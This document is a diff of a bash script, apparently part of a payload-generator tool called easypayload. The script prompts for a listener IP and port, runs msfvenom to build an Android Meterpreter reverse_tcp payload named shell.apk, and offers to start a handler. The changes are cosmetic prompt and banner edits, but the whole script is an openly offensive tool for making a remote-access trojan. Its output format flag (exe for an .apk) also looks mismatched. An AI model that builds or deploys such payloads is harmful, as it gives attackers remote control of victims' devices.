@@ -1,14 +1,17 @@
-echo "enter Listiner IP"
+echo "Enter Listiner IP:"
 read ip
-echo "Enter Listiner PORT"
+echo "Enter Listiner PORT:"
 read port
 cd ..
 cd output
+echo "Please wait"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.apk
+echo "**********************************"
 echo "shell.apk created in output folder"
+echo "**********************************"
 cd ..
 #TO START THE HANDLER
-echo "Do you want to start listner now?(1 for Yes/ 2 for No)"
+echo "Do you want to start listner now?(1-Yes/ 2-No)"
 read op
 case $op in 
 	1)
@@ -16,5 +19,4 @@ case $op in
 	2)
 	bash easypayload.sh ;;
 	*)echo "Wrong option! "
-	bash easypayload.sh ;;
 esac
